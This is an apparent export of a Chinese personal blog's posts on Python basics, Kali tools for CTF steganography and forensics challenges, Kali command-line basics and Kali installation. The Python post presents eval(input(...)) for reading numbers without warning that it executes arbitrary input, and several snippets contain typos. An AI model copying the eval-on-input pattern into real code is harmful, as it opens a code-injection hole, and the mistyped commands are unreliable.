title="赋值语句"></a>赋值语句</h3><p>（1）”=”表示赋值，包含等号的语句称为赋值语句，即将等号右侧的计算结果赋给左侧变量。例如：</p><pre><code class="python">TempStr = input(&quot;请输入带有符号的温度值：&quot;)   #将input()函数的结果赋给左侧变量TempStr</code></pre><p>（2）同步赋值语句，可以同时给多个变量赋值。若多个单一赋值语句在功能上表达了相同或相关的含义，或者在程序中属于相同的功能，都可以采用同步赋值语句。基本格式如下：</p><pre><code>&lt;变量1&gt;,…… &lt;变量n&gt; = &lt;表达式1&gt;,…… &lt;表达式n&gt;</code></pre><pre><code class="python">&gt;&gt;&gt;x, y = 10, 20&gt;&gt;&gt;print(x,y)10 20&gt;&gt;&gt;x, y = y, x       //交换x，y的数值不必再借助第三个变量&gt;&gt;&gt;print(x,y)20 10</code></pre><h3 id="input-函数"><a href="#input-函数" class="headerlink" title="input()函数"></a>input()函数</h3><p>在实例1中，input()函数从控制台获得用户输入，无论用户在控制台输入什么内容，input()函数都以字符串类型返回结果。在获得用户输入之前，input()函数可以包含一些提示性文字。</p><pre><code>&gt;&gt;&gt;input(&quot;请输入：&quot;)请输入：Python&#39;Python&#39;&gt;&gt;&gt;input(&quot;请输入：&quot;)请输入：12345&#39;12345&#39;</code></pre><p><img src="https://i.loli.net/2020/11/26/JbFk8tzdfEQmjg6.png" alt="image-20201126175216693"></p><h3 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h3><p>分支语句的作用是根据判断条件选择程序执行路径，使用方法如下：</p><pre><code class="python">if &lt;条件1&gt;:    &lt;语句块1&gt;elif &lt;条件2&gt;:    &lt;语句块2&gt;...else:    &lt;语句块n&gt;</code></pre><p>其中，if、elif、else都是保留字，else后不再增加条件，表示不满足其他if语句的所有其余情况。例如实例1中的分支语句：</p><pre><code class="python">if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:else:</code></pre><p>第一个表达式由保留字”in”组成，表示判断字符串TempStr的最后一个字符(TempStr[-1])是否在一个由’F’或’f’组成的集合中，即TempStr[-1]是否等于’F’或’f’。如果相等，返回True，执行该条件下的语句块；否则返回False，判断下一个条件。其中用方括号和逗号组成的类型叫列表，格式为：[元素1,元素2,…,元素n]。</p><h3 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h3><p>eval(&lt;字符串&gt;)函数能够以Python表达式的方式解析并执行字符串，并将返回结果输出。例如：</p><pre><code class="python">&gt;&gt;&gt;x = 1&gt;&gt;&gt;eval(&quot;x + 1&quot;)2&gt;&gt;&gt;eval(&quot;1.1 + 2.2&quot;)3.3</code></pre><p>实例1中eval()函数将用户的部分输入(TempStr[0:-1])由字符串转化为数字，假设用户的输入为“102C”，经过eval()函数处理，转变为Python内部可以进行数学运算的的数值102</p><pre><code class="python">&gt;&gt;&gt;TempStr = &quot;102C&quot;&gt;&gt;&gt;eval(TempStr[0:-1])102</code></pre><p>使用eval()函数注意事项：</p><p>（1）若直接输入字符串”hello”，eval()函数会去掉两个引号，将其解释为一个变量。由于之前没有定义过hello变量，解释器会报错。</p><p>（2）当输入字符串”‘hello’”时，eval()函数去掉外部双引号后，内部还有一个单引号，则’hello’被解释为字符串。</p><p>（3）若要输入一个数字（小数或负数），并用程序对这个数字进行计算，可以采用eval(input(输入提示字符串))的组合，例如：</p><pre><code class="python">&gt;&gt;&gt;vlaue = eval(input(&quot;请输入要计算的数值：&quot;))请输入要计算的数值：1024&gt;&gt;&gt;print(value*2)2048</code></pre><p>（4）实例1中的代码：</p><pre><code class="python">C = (eval(TempStr[0:-1]) - 32)/1.8</code></pre><p>表示将TempStr字符串中除最后一位外的子串转换成数字，再对其进行运算。</p><h3 id="print-函数"><a href="#print-函数" class="headerlink" title="print()函数"></a>print()函数</h3><p>（1）print()是输出函数，当输出纯字符信息时，加上双引号或单引号即可直接把待输出的内容传递给print()函数。例如：</p><pre><code class="python">&gt;&gt;&gt;print(&quot;我爱我家&quot;)我爱我家</code></pre><p>（2）当输出变量值时，需要采用格式化输出方式，通过format()方法将待输出的变量整理成期望输出的格式。例如实例1中：</p><pre><code class="python">print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))</code></pre><p>print()函数用槽格式和format()方法将变量和字符串结合到一起输出。上述代码中，大括号{}表示一个槽位置，这个大括号的内容由后面的format()方法中的参数C或F填充。其中，大括号{:.2f}中的内容表示变量C(或F)的输出格式，具体为输出数值保留两位小数。</p><h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>（1）循环语句的作用是根据判断条件确定一段程序是否再次执行一次或多次。实例1中不包含循环语句，程序执行一次后退出，若要让程序一直运行，连续接收用户的输入，可以采用循环语句进行改造。</p><pre><code class="python">TempStr = input(&quot;请输入带有符号的温度值：&quot;)while TempStr[-1] not in [&#39;N&#39;,&#39;n&#39;]:                #改造1，直到用户输入的最后一个字符是N或n时退出    if TempStr[-1] in [&#39;F&#39;,&#39;f&#39;]:        C = (eval(TempStr[0:-1]) - 32)/1.8        print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))    elif TempStr[-1] in [&#39;C&#39;,&#39;c&#39;]:        F = 1.8*eval(TempStr[0:-1]) + 32        print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))    else:        print(&quot;输入格式错误&quot;)    TempStr = input(&quot;请输入带有符号的温度值：&quot;)        #改造2</code></pre><p>（2）循环语句有多种类型，改造后的代码使用了条件循环，其基本过程如下：</p><pre><code class="python">while&lt;条件&gt;:    &lt;语句块1&gt;&lt;语句块2&gt;</code></pre><p>缩进表达了与while语句的所属关系。当条件为真时，进入循环，执行语句块1；当条件为假时，退出循环，执行语句块2。改造后的代码中的循环条件：</p><pre><code class="python">while TempStr[-1] not in [&#39;N&#39;,&#39;n&#39;]:</code></pre><p>语句中的not是保留字，表示对判断结果取反。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>（1）函数是对一组表达特定功能表达式的封装，能够接收变量并输出结果。input()、print()、eval()都是Python解释器的内置函数。编写代码时，函数的使用有助于阅读和复用，也使得程序模块化更好。</p><p>实例1中，程序按照顺序方式，从头到尾执行，对其进行如下改造：</p><pre><code class="python">def tempConvert(ValueStr):    if ValueStr[-1] in [&#39;F&#39;,&#39;f&#39;]:        C = (eval(ValueStr[0:-1]) - 32)/1.8        print(&quot;转换后的温度是&#123;:.2f&#125;C&quot;.format(C))    elif ValueStr[-1] in [&#39;C&#39;,&#39;c&#39;]:        F = 1.8*eval(ValueStr[0:-1]) + 32        print(&quot;转换后的温度是&#123;:.2f&#125;F&quot;.format(F))    else:        print(&quot;输入格式错误&quot;) TempStr = input(&quot;请输入带有符号的温度值：&quot;)tempConvert(TempStr)</code></pre><p>（2）上述代码中，用def保留字定义了一个名为tmpConvert()的函数，它使用一个参数ValueStr，函数所属代码是def所在行和其后面与之有缩进关系的代码。</p><p>（3）由def保留字定义的函数在程序中不被直接执行，需要使用函数名称调用才能执行。所以程序是从第10行开始执行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识Python语言(一)</title>
      <link href="2020/11/24/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%80)/"/>
      <url>2020/11/24/Python/%E5%88%9D%E8%AF%86Python%E8%AF%AD%E8%A8%80(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<h2 id="编译和解释"><a href="#编译和解释" class="headerlink" title="编译和解释"></a>编译和解释</h2><p>（1)高级语言按照计算机执行方式的不同可分成两类：静态语言和脚本语言。这里的执行方式是指计算机执行一个程序的过程，静态语言采用编译执行，脚本语言采用解释执行。</p><p>（2）编译：将源代码(高级语言代码)转换为目标代码(机器语言代码)的过程，执行编译的计算机程序称为编译器。编译是一次性的翻译，一旦程序被编译，则目标代码不再需要编译器就可以运行。</p><p>（3）解释：将源代码逐条转换成目标代码的同时逐条运行目标代码的过程，执行解释的计算机程序称为解释器。</p><p>解释在每次程序运行时都需要解释器和源代码。</p><table><thead><tr><th align="center">语言类型</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">静态语言(编译执行)</td><td align="center">C语言、Java语言</td></tr><tr><td align="center">脚本语言(解释执行)</td><td align="center">JavaScript语言、PHP语言、Python语言</td></tr></tbody></table><p>（4）Python语言虽然采用解释执行方式，但它的解释器也保留了编译器的部分功能，随着程序运行，解释器也会产生一个完整的目标代码。这种将解释器和编译器结合的新解释器是现代脚本语言为了提升计算机性能的一种有益演进。</p><h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><p>可在Python解释器自带的idle下编写Python语句，路径：D:\Python\Lib\idlelib，在该目录下双击idle.bat即可开始编写，也可直接在Windows下的“开始”菜单中搜索关键字”idle”找到快捷方式打开。</p><pre><code class="python">&gt;&gt;&gt;print(&quot;Hello World&quot;)Hello World</code></pre><p>其中，第一行的”&gt;&gt;&gt;”是Python语言运行环境的提示符，表示可以在这后面输入Python语句。第二行则是Python语句的执行结果。</p><h2 id="Python语言的特点"><a href="#Python语言的特点" class="headerlink" title="Python语言的特点"></a>Python语言的特点</h2><p>语法简洁、跨平台、可扩展、开源通用、支持中文、模式多样(支持面向过程和面向对象两种编程方式)、类库丰富的脚本语言。</p><h2 id="运行方式"><a href="#运行方式" class="headerlink" title="运行方式"></a>运行方式</h2><p>运行Python程序有两种方式：交互式和文件式。</p><p>交互式指Python解释器即时响应用户输入的每条代码，给出输出结果，一般用于调试少量代码。</p><p>文件式，也称为批量式，指用户将Python程序写在一个或多个文件中，然后启动Python解释器批量执行文件中的代码，是最常用的编程方式。</p><h3 id="交互式启动和运行方法"><a href="#交互式启动和运行方法" class="headerlink" title="交互式启动和运行方法"></a>交互式启动和运行方法</h3><p>交互式有两种启动和运行方法。</p><p>第一种方法，启动Windows命令行工具，Windows键+R快速打开运行窗口，输入”cmd”，在控制台输入”python”，在命令提示符”&gt;&gt;&gt;”后输入程序代码，回车后显示输出结果。在”&gt;&gt;&gt;”提示符后输入exit()或quit()可以退出Python运行环境。</p><p><img src="https://i.loli.net/2020/11/24/4jOUhvayTeZof5m.png" alt="image-20201124195448770"></p><p>第二种方法，通过调用IDLE来启动Python运行环境。</p><p><img src="https://i.loli.net/2020/11/24/4iaNIMPFjfoO5ry.png" alt="image-20201124195840923"></p><h3 id="文件式启动和运行方法"><a href="#文件式启动和运行方法" class="headerlink" title="文件式启动和运行方法"></a>文件式启动和运行方法</h3><p>文件式也有两种运行方式。</p><p>第一种方法，按照Python的语法格式在任意的编辑器中编写代码，可以使用Python安装包中的IDLE编辑器或者notepad++，然后保存为xx.py形式的文件。之后，进入xx.py文件所在目录，打开Windows的命令行窗口，输入</p><pre><code>python xxx.py</code></pre><p>即可运行Python程序文件获得输出。</p><p><img src="https://i.loli.net/2020/11/24/sXkwqECbHKyfrZW.png" alt="image-20201124201902643"></p><p>第二种方法，打开IDLE，按快捷键Ctrl+N打开一个新窗口，或者在菜单中选择File–&gt;New File选项。这个新窗口不再是交互模式，而是一个具备Python语法高亮辅助的编辑器，可进行代码编辑。编写完代码并保存为xx.py文件后，按快捷键F5，或者在菜单中选择Run–&gt;Run Module选项运行该文件。</p><p><img src="https://i.loli.net/2020/11/24/1O45caGsVpeJyhH.png" alt="image-20201124202318979"></p><h3 id="启动和运行方法推荐"><a href="#启动和运行方法推荐" class="headerlink" title="启动和运行方法推荐"></a>启动和运行方法推荐</h3><p>IDLE是一个简单有效的集成开发环境，支持交互式和文件式。其中，最常用且最重要的是采用IDLE的文件式方法。IDLE是小规模Python软件项目的主要编写工具，比IDLE更强大的Python语言集成开发环境是PyCharm，它主要用于中规模及以上的软件开发项目。</p><h2 id="运行Python小程序"><a href="#运行Python小程序" class="headerlink" title="运行Python小程序"></a>运行Python小程序</h2><p>（1）同切圆的绘制</p><p>文件式：</p><pre><code>import turtle            #引入turtle库turtle.pensize (2)       #设置画笔宽度为2像素turtle.circle (10)       #绘制半径为10像素的圆turtle.circle (40)       #绘制半径为40像素的圆turtle.circle (80)       #绘制半径为80像素的圆turtle.circle (160)      #绘制半径为160像素的圆</code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2020/11/24/eHTuq74hitLckSF.png" alt="image-20201124234947504"></p><p>（2）日期和时间的输出</p><p>交互式：</p><pre><code>&gt;&gt;&gt;from datetime import datetime   #引用datetime库&gt;&gt;&gt;now = datetime.now()            #获取当前日期和时间信息&gt;&gt;&gt;print(now)&gt;&gt;&gt;now.strftime(&quot;%x&quot;)              #输出其中的日期部分&gt;&gt;&gt;now.strftime(&quot;%X&quot;)              #输出其中的时间部分</code></pre><p><img src="https://i.loli.net/2020/11/24/N2hJvTAxtF5y1Gw.png" alt="image-20201124235205031"></p><p>文件式：</p><pre><code>from datetime import datetime   #引用datetime库now = datetime.now()            #获取当前日期和时间信息print(now)print(now.strftime(&quot;%x&quot;))       #输出其中的日期部分print(now.strftime(&quot;%X&quot;))       #输出其中的时间部分，其中X大写</code></pre><p><img src="https://i.loli.net/2020/11/24/vhlAxUZELmpGYR6.png" alt="image-20201124233441815"></p><p>（3）import保留字用来引入函数库，绘制图形可以使用turtle库，获得系统的日期和时间使用datetime库</p><h2 id="程序的基本编写方法"><a href="#程序的基本编写方法" class="headerlink" title="程序的基本编写方法"></a>程序的基本编写方法</h2><h3 id="IPO程序编写方法"><a href="#IPO程序编写方法" class="headerlink" title="IPO程序编写方法"></a>IPO程序编写方法</h3><p>无论程序规模如何，每个程序都有统一的运算模式：输入数据、处理数据和输出数据。这种运算模式形成了基本的程序编写方法：IPO(Input，Process，Output)方法。</p><h3 id="输入-Input"><a href="#输入-Input" class="headerlink" title="输入(Input)"></a>输入(Input)</h3><p>输入是一个程序的开始。程序要处理的数据有多种来源，因此形成了多种输入方式。</p><table><thead><tr><th align="left">输入方式</th><th align="left">输入来源</th></tr></thead><tbody><tr><td align="left">文件输入</td><td align="left">文件</td></tr><tr><td align="left">网络输入</td><td align="left">互联网上的数据</td></tr><tr><td align="left">控制台输入</td><td align="left">程序使用者输入的信息</td></tr><tr><td align="left">交互界面输入</td><td align="left">通过提供一个图形交互界面从用户处获取</td></tr><tr><td align="left">随机数据输入</td><td align="left">将随机数作为程序输入，需要使用特定的随机数生成器程序或调用相关函数</td></tr><tr><td align="left">内部参数输入</td><td align="left">以程序内部定义的初始化变量作为输入</td></tr></tbody></table><h3 id="输出-Output"><a href="#输出-Output" class="headerlink" title="输出(Output)"></a>输出(Output)</h3><p>输出是程序展示运算成果的方式。</p><table><thead><tr><th>输出方式</th><th>具体实现</th></tr></thead><tbody><tr><td>控制台输出</td><td>通过程序运行环境中的命令打印输出结果，例如Windows中的命令行工具、IDLE工具</td></tr><tr><td>图形输出</td><td>在计算机中启动独立的图形输出窗口，根据指令绘制运算结果</td></tr><tr><td>文件输出</td><td>以生成新的文件或修改已有文件方式输出运行结果，是程序常用的输出方式</td></tr><tr><td>网络输出</td><td>以访问网络接口方式输出数据</td></tr><tr><td>操作系统内部变量输出</td><td>程序将运行结果输出到系统内部变量中，这类变量包括管道、线程、信号量等</td></tr></tbody></table><h3 id="处理-Process"><a href="#处理-Process" class="headerlink" title="处理(Process)"></a>处理(Process)</h3><p>处理是程序对输入数据进行计算产生输出结果的过程，计算问题的处理方法统称为“算法”。</p><h3 id="无限循环程序"><a href="#无限循环程序" class="headerlink" title="无限循环程序"></a>无限循环程序</h3><p>无限循环程序没有输入输出，例如：</p><pre><code class="python">while(True)   a = 1</code></pre><p>由于没有输入输出，代码会一直执行下去。该程序快速消耗CPU的计算资源，可以用来辅助测试CPU或系统性能。不过，没有输入输出的程序功能十分有限，仅在特殊情况下使用。</p><h2 id="Python语言的版本更迭"><a href="#Python语言的版本更迭" class="headerlink" title="Python语言的版本更迭"></a>Python语言的版本更迭</h2><p>Python2.x已是遗产，Python3.x是这个语言的现在和未来。Python2.x系列的最后一个版本，其主版本号为2.7。</p><p>版本之间的区别：更多区别可以查看Guido的文章：<a href="https://docs.python.org/3/whatsnew/3.0.html">https://docs.python.org/3/whatsnew/3.0.html</a></p><p>（1）修改编码：3.x系列默认采用UTF-8编码，表达UTF-8编码字符串时，无需在前面加上u或者U</p><p>（2）修改print语句：用print()函数替换了print语句，功能一样，格式不同</p><pre><code class="python">2.x:&gt;&gt;&gt;print &quot;The answer is&quot;, 2*23.x:&gt;&gt;&gt;print(&quot;The answer is&quot;, 2*2)2.x:&gt;&gt;&gt;print x3.x:&gt;&gt;&gt;print(x,end=&quot;,&quot;)</code></pre><p>（3）修改exec语句：用exec()函数替换了exec语句，功能一样，格式不同</p><p>（4）去掉&lt;&gt;符号，用!=表示“不等于”</p><p>（5）修改比较行为：用&lt;、&lt;=、&gt;=、&gt;符号比较两个元素时，若元素之间不存在有意义的顺序关系，将抛出TypeError错误，不再返回False，例如：</p><pre><code class="python">2.x:&gt;&gt;&gt;1 &lt; &quot;1&quot;False3.x:&gt;&gt;&gt;1 &lt; &quot;1&quot;Traceback (most recent call last):  File &quot;&lt;pyshell#3&gt;&quot;, line 1, in &lt;module&gt;    1 &lt; &quot;1&quot;TypeError: &#39;&lt;&#39; not supported between instances of &#39;int&#39; and &#39;str&#39;</code></pre><p>（6）Python3.x系列不再区分整数和长整数类型，只有一个int类型，且无取值范围限制。因此，sys.maxint常量被去掉</p><p>（7）修改整数除法：两个整数的一般除法(/)返回一个浮点数，不再返回一个整数，若想返回整数，则用整数除法(//)</p><pre><code class="python">2.x:&gt;&gt;&gt;3/213.x:&gt;&gt;&gt;3/21.53.x:&gt;&gt;&gt;3//21</code></pre><p>（8）3.x系列八进制整数格式使用0o开头，而不再使用0开头</p><p>（9）增加as、with、True、False、None作为关键字</p><p>（10）去掉raw_input()函数，用input()函数代替，input()返回一个字符串</p><p>（11）修改range()函数，与Python2.x系列中的xrange()类似，不再显示返回一个列表。若要返回列表，则需要通过list()函数转换</p><pre><code class="python">2.x:&gt;&gt;&gt;range(10)[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]3.x:&gt;&gt;&gt;range(10)range(0,10)3.x:&gt;&gt;&gt;list(range(10))[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]</code></pre><p>（12）修改返回类型：除range()外，zip()、map()、filter()、字典类型的key()方法、value()方法、item()方法不再返回列表类型</p><p>（13）修改异常处理表达：使用as关键字标识异常信息，例如：</p><pre><code class="python">2.x:&gt;&gt;&gt;try:       ...   wrong_name       ...except NameError, err:       ...   print err       ...       name &#39;wrong_name&#39; is not defined3.x:&gt;&gt;&gt;try:       ...   wrong_name       ...except NameError as err:       ...   print(err)       ...name &#39;wrong_name&#39; is not defined</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解Misc题常用的kali工具</title>
      <link href="2020/11/23/kali/%E8%A7%A3Misc%E9%A2%98%E5%B8%B8%E7%94%A8%E7%9A%84kali%E5%B7%A5%E5%85%B7/"/>
      <url>2020/11/23/kali/%E8%A7%A3Misc%E9%A2%98%E5%B8%B8%E7%94%A8%E7%9A%84kali%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><p>binwalk是一款Python编写的工具，在kali中已经预安装了，可以在Python2和Python3的环境下运行，在Python3中运行速度更快。</p><pre><code>apt-get install binwalk         //安装binwalkbinwalk file                 //查看是否存在隐藏文件binwalk -e file              //文件提取</code></pre><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><p>foremost在kali中已经预安装，可用于文件的分离</p><pre><code>apt-get install foremost     //安装foremostforemost -t all file         //分离文件，-t 指定文件类型，all则表示全部，后跟要分离的文件</code></pre><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><p>zsteg可用于检测png和bmp图片里的隐写数据，为了使安装更快，要换为国内源</p><pre><code>gem sources -l             //查看现有源gem sources --remove https://rubygems.org/    //删除现有源gem sources -a http://gems.ruby-china.com/    //添加新源apt-get install gem        //安装gem，若不换源则需要等待许多时间gem install zsteg          //安装zsteg#使用方法，查看lsb数据zsteg xxx.bmpzsteg xxx.pngzsteg -a file             //查看各个通道的lsb</code></pre><h2 id="convert"><a href="#convert" class="headerlink" title="convert"></a>convert</h2><p>convert可以分解gif动图，kali自带的工具，无需安装</p><pre><code>convert xxx.gif flag.png       //分解gif动图，得到每一帧的图片按顺序以flag-x.png命名，-x为序号</code></pre><h2 id="montage"><a href="#montage" class="headerlink" title="montage"></a>montage</h2><p>montage用于图片的拼接，kali自带，无需安装，通常结合convert使用</p><pre><code>montage flag*.png -tile x1 -geometry +0+0 flag.png//-tile是拼接时每行和每列的图片数，这里用x1，就是只一行//-geometry是首选每个图和边框尺寸，边框为0，图照为原始尺寸//拼接好的图片命名为flag.png</code></pre><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><p>查看可以打印的字符，通常可以借助管道符+grep匹配flag信息</p><pre><code>strings filestrings file | grep flag</code></pre><h2 id="git-stash"><a href="#git-stash" class="headerlink" title="git stash"></a>git stash</h2><p>保存当前的工作区与暂存区的状态，把当前的工作隐藏起来，等需要的时候再恢复</p><pre><code>git log           //查看git记录git stash list    //查看修改列表git stash show    //校验列表中的存储文件git stash apply   //恢复被隐藏的文件</code></pre><h2 id="gnuplot"><a href="#gnuplot" class="headerlink" title="gnuplot"></a>gnuplot</h2><p>gnuplot是一个命令行的交互式绘图工具。</p><pre><code>apt-get install gnuplot       //安装gnuplot工具</code></pre><p>使用：</p><p>在终端输入gnuplot，之后输入plot，后跟坐标文件，回车后即可看到绘制的图片。</p><p>例如BugkuCTF中的图穷匕见：</p><p><img src="https://i.loli.net/2020/11/24/LqcMiNKyJ5enmAl.png" alt="image-20201124170748506"></p><p><img src="https://i.loli.net/2020/11/24/5ySqZlarOGKsB1g.png" alt="image-20201124170808090"></p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali的基本使用</title>
      <link href="2020/11/20/kali/kali%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
      <url>2020/11/20/kali/kali%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="基本守则"><a href="#基本守则" class="headerlink" title="基本守则"></a>基本守则</h2><p>（1）Linux系统大小写敏感</p><p>（2）文件名前带“.”是隐藏文件</p><p>（3）配置文件#开头代表是注释行，程序不执行改行</p><p>（4）Linux系统下的“/”相当于DOS下的“\”</p><p>（5）超级用户“#”，普通用户“$”</p><h2 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h2><p>将特殊字符转换成普通字符</p><p>（1）\        反斜杠，对单个字符进行转义</p><p>（2）’’        单引号，对一串字符进行转义</p><p>（3）``     反引号，可将命令二次处理</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="X-windows（图形化）与控制台（shell）间的切换"><a href="#X-windows（图形化）与控制台（shell）间的切换" class="headerlink" title="X-windows（图形化）与控制台（shell）间的切换"></a>X-windows（图形化）与控制台（shell）间的切换</h3><p>（1）X-windows切换到控制台：</p><pre><code>init 3</code></pre><p>或使用快捷键：Ctrl+alt+F3</p><p>（2）控制台切换到X-windows：</p><pre><code>startx或init 5</code></pre><h3 id="设置默认开机界面"><a href="#设置默认开机界面" class="headerlink" title="设置默认开机界面"></a>设置默认开机界面</h3><p>（1）查看当前系统默认开机界面</p><pre><code>systemctl get-default</code></pre><p>（2）设置开机默认为X-windows</p><pre><code>systemctl set-default graphical.target</code></pre><p>（3）设置开机默认为控制台</p><pre><code>systemclt set-default multi-user.target</code></pre><p>（4）命令可用tab键补全</p><h3 id="关机，重启，注销用户，锁屏，解锁"><a href="#关机，重启，注销用户，锁屏，解锁" class="headerlink" title="关机，重启，注销用户，锁屏，解锁"></a>关机，重启，注销用户，锁屏，解锁</h3><p>（1）关机，三种方式：</p><pre><code>shutdown -h nowhaltinit0</code></pre><p>（2）重启，三种方式：</p><pre><code>shutdown -r nowrebootinit 6</code></pre><p>（3）注销用户，退出登录</p><p>控制台界面下：</p><pre><code>exit    或快捷键Ctrl+D</code></pre><p>X-windows界面或shell下：</p><pre><code>pkill -kill -t tty7</code></pre><p>（4）锁屏，快捷键：Ctrl+s</p><p>（5）解锁，快捷键：Ctrl+q</p><h3 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h3><table><thead><tr><th align="center">命令</th><th align="center">解释</th><th align="center">示例</th></tr></thead><tbody><tr><td align="center">history</td><td align="center">显示历史命令</td><td align="center">!5      //执行第5行的命令</td></tr><tr><td align="center">echo</td><td align="center">回显命令</td><td align="center"></td></tr><tr><td align="center">uname</td><td align="center">显示系统信息</td><td align="center">-a参数     //显示全部信息</td></tr><tr><td align="center">hostname</td><td align="center">显示主机名</td><td align="center"></td></tr><tr><td align="center">date</td><td align="center">显示或修改系统时间</td><td align="center">-s “20201120 12:12:00”</td></tr><tr><td align="center">cal</td><td align="center">显示日历</td><td align="center">cal 01 2020 //显示2020年1月的日历</td></tr><tr><td align="center">who、w</td><td align="center">查看登录用户信息</td><td align="center"></td></tr><tr><td align="center">whoami</td><td align="center">显示用户名</td><td align="center"></td></tr><tr><td align="center">which</td><td align="center">显示命令所在位置</td><td align="center"></td></tr><tr><td align="center">whereis</td><td align="center">显示文件位于系统中的什么位置</td><td align="center"></td></tr><tr><td align="center">whatis</td><td align="center">显示命令的简短描述</td><td align="center"></td></tr><tr><td align="center">命令 –help</td><td align="center">显示命令的使用摘要和参数列表</td><td align="center"></td></tr><tr><td align="center">man</td><td align="center">显示命令的说明文档</td><td align="center"></td></tr></tbody></table><p>ps：man命令：查看文档时，直接输入/keyword  即可在文档中搜索keyword这个关键字，n跳到下一个关键字，N跳到上一个关键字，键q离开说明文档</p><h2 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h2><table><thead><tr><th align="center">tab</th><th align="center">自动补全命令</th></tr></thead><tbody><tr><td align="center">Ctrl+a</td><td align="center">把光标移动到命令行最开始的地方</td></tr><tr><td align="center">Ctrl+e</td><td align="center">把光标移动到命令行末尾</td></tr><tr><td align="center">Ctrl+u</td><td align="center">删除当前光标前的所有内容</td></tr></tbody></table>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali2020.1安装过程</title>
      <link href="2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/"/>
      <url>2020/11/18/kali/kali2020.1%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="准备资源"><a href="#准备资源" class="headerlink" title="准备资源"></a>准备资源</h2><p>（1）kali2020.1镜像，下载链接:<a href="https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso">https://cdimage.kali.org/kali-2020.1/kali-linux-2020.1-installer-amd64.iso</a></p><p>（2）VMware</p><p>（3）良好的网络环境</p><p>（4）物理计算机至少有8G的内存，以保证在后续使用虚拟机时的流畅</p><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="新建一个虚拟机"><a href="#新建一个虚拟机" class="headerlink" title="新建一个虚拟机"></a>新建一个虚拟机</h3><p>（1）打开VMware，新建一个虚拟机</p><p><img src="https://i.loli.net/2020/11/18/5XWaNzcn7CAwHh9.png" alt="image-20201118194822750"></p><p>（2）会弹出两种安装方式，这里我选择自定义安装</p><p><img src="https://i.loli.net/2020/11/18/TSrnQKmefyx51MA.png" alt="image-20201118194943515"></p><p>（3）默认选择下一步，直到“安装客户机操作系统”，这里选择“稍后安装操作系统”</p><p><img src="https://i.loli.net/2020/11/18/4ipg25EmeGxB3wO.png" alt="image-20201118195206604"></p><p>（4）选择操作系统及其版本</p><p><img src="https://i.loli.net/2020/11/18/ShvCRwpOme84uQA.png" alt="image-20201118195449341"></p><p>（5）给虚拟机命名，并给其选择存放位置，这里建议在VMware目录下新建一个与虚拟机名称一样的文件夹，将虚拟机存在这个文件夹里。</p><p><img src="https://i.loli.net/2020/11/18/sFnwLfxpku4M2zt.png" alt="image-20201118195753952"></p><p>（6）配置处理器数量</p><p><img src="https://i.loli.net/2020/11/20/3sUfFGozpgAjuZC.png" alt="image-20201119125125453"></p><p>（7）为虚拟机分配内存，这里可以分配多一点，以便在后续的安装中更快</p><p><img src="https://i.loli.net/2020/11/18/Q8PkLYq3iTphnxO.png" alt="image-20201118200631782"></p><p>（8）网络类型选择NAT模式，桥接模式需要一个真实的IP，在校园里一般都是NAT模式。</p><p>（9）之后便一直默认下一步，直到为虚拟机分配磁盘容量，这里可自行定义</p><p><img src="https://i.loli.net/2020/11/18/XsACzh1xDS8IPla.png" alt="image-20201118200852936"></p><p>（10）默认下一步，直到“自定义硬件”，这里可以移除一些平时不用的硬件配置，比如USB控制器、声卡、打印机。点击“自定义硬件”即可在里面移除不用的硬件，然后点击完成。</p><p><img src="https://i.loli.net/2020/11/18/moWHl74GbhLCOsP.png" alt="image-20201118221327164"></p><p>（11）可看到已经创建好了一个虚拟机，此时便要用到下载好的镜像了。点击“CD/DVD(IDE)”,选择“使用ISO映像文件”，添加下载好的镜像，点击确定。</p><p><img 